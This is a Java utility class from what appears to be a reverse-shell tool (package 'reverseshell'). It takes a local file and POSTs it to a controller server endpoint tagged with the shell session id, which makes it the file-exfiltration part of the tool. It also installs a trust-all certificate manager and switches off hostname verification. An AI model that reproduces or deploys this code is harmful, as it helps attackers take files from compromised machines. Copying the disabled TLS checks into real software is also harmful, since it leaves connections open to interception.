package com.mtattab.reverseshell.util;

import lombok.experimental.UtilityClass;
import okhttp3.*;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.IOException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;

@UtilityClass
public class S3UploadUtil {

    private static TrustManager[] trustAllCertificates;


    public static String uploadToS3(File fileToUpload) {
        try {
            Response response= uploadFile(fileToUpload);
            System.out.println(response);

            return "File: "+fileToUpload.getName()+" was sent to api endpoint. Api output: "+ response.body().string() ;
        }catch (Exception e){
            e.printStackTrace();
            return "failed with error: " +e.getMessage();

        }


    }




    private static Response uploadFile(File fileToUpload) throws IOException {
        SSLContext sslContext= createInsecureSslContext();

        String uri = Constants.SERVER_HTTP_URI +
                Constants.S3_API_ENDPOINT+
                Constants.S3_API_UPLOAD+
                Constants.S3_API_UPLOAD_SESSION_PARAM+ ReverseShellSession.getSessionId();

        OkHttpClient client = new OkHttpClient().newBuilder()
                .hostnameVerifier( (s, sslSession) -> true) // Disable hostname verification
                .sslSocketFactory(sslContext.getSocketFactory(),(X509TrustManager) trustAllCertificates[0])

                .build();



        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("file",fileToUpload.getName(),

                        RequestBody.create(MediaType.parse("application/octet-stream"),
                                fileToUpload))
                .build();

        Request request = new Request.Builder()
                .url(uri)
                .method("POST", body)
                .build();

        Response response = client.newCall(request).execute();

        return response;
    }


    private static SSLContext createInsecureSslContext() {
        SSLContext sslContext = null;
        try {
            sslContext = SSLContext.getInstance("TLS");

            // Create a TrustManager that trusts all certificates
            trustAllCertificates = new TrustManager[]{
                    new X509TrustManager() {
                        public X509Certificate[] getAcceptedIssuers() {
                            return new X509Certificate[0];
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };

            sslContext.init(null, trustAllCertificates, new SecureRandom());



        }catch (Exception e){
            e.printStackTrace();

        }

        return sslContext;

    }


}
